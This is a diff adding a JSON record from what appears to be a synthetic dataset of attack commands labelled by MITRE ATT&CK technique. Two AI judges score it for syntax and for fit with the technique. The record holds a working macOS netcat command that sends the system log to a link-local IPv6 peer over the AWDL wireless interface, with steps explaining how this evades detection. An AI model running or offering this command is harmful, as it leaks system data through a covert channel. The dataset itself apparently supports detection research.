@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr awdl0)\" \"fe80::b0b:beef:1%awdl0\" 52789 < /var/log/system.log",
+  "explanation": "Exfiltrates data over the AWDL (Apple Wireless Direct Link) interface using IPv6 UDP to a link-local peer on an uncommon port, aligning with T1011 by leveraging a non-primary network medium distinct from typical egress paths.",
+  "rationale_steps": [
+    "Use ipconfig to obtain the IPv6 address assigned to the AWDL interface (awdl0).",
+    "Bind netcat to that source address to force use of the AWDL medium.",
+    "Send the selected data via IPv6 UDP to a link-local target on an uncommon port to reduce detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-bbd64a1a",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, valid nc flags (-6, -u, -s), proper IPv6 scope (%awdl0) on the destination, and correct input redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly transmits /var/log/system.log via IPv6/UDP bound to awdl0, but it does not implement traffic signaling behaviors (e.g., embedded signals/timing/covert fields) so alignment to T1011 is only partial.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T15:18:10.126380Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard macOS utilities, valid Bash syntax for command substitution and input redirection, and correctly formatted IPv6 addresses with scope IDs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately leverages `nc` to exfiltrate a log file via IPv6 UDP over the AWDL interface to a link-local peer on an uncommon port, perfectly aligning with the T1011 technique by using an unconventional network path for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T15:18:27.575781Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
